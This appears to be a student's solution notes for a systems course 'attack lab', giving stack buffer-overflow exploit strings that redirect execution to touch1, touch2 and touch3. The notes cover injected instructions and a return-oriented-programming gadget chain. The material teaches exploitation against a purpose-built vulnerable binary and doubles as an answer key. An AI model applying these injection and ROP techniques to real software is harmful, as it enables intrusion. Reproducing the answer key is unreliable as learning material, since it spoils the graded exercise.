Phase 0
=======

Determine address of touch1()

Determine size allocated for stack

Convert address using hex2raw

Insert address in buffer (pad rest with 00's)

Sample buffer:

  00 00 00 00 00 00 00 00

  00 00 00 00 00 00 00 00

  00 00 00 00 00 00 00 00

  55 19 40 00 00 00 00 00  /* address of touch1 */

Phase 1
=======

Similar to previous phase, but call a function with an argument

Will call touch2(cookie)

Make a .s file with movl cookie, $edi 

Generate .o file with gcc

	gcc -c file.s

Obtain hex for instruction

	objump -d file.o

Insert instruction 

Sample buffer:

  bf 9a d9 e2 68 c3 00 00  /* instruction: 
				movl cookie, edi
				retq */

  00 00 00 00 00 00 00 00

  00 00 00 00 00 00 00 00

  38 81 67 55 00 00 00 00  /* address of movl cookie, edi */

  81 19 40 00 00 00 00 00  /* address of touch2 */

Phase 2
=======

Call touch3() with cookie's string representation as argument
Similar strategy as in Phase 1 but you have to put the argument
deeper in the stack because if not, other called functions will overwrite
it. To work, the buffer must be large (I did 24 * 8 bytes), and I put the
argument at the end. The trickiest part is making sure that you get the 
right endian form for the string and you know where the address of the 
argument is.

Solution:

48 8d 3c 25 f8 81 67 55
c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 81 67 55 00 00 00 00  
8f 1a 40 00 00 00 00 00
48 c7 04 25 e7 81 67 55  
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
36 38 65 32 64 39 39 61

Phase 3
=======
Use return oriented programming to call touch2(cookie)
Solution:

dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd
5d 1b 40 00 00 00 00 00
9a d9 e2 68 00 00 00 00
35 1b 40 00 00 00 00 00
81 19 40 00 00 00 00 00                         
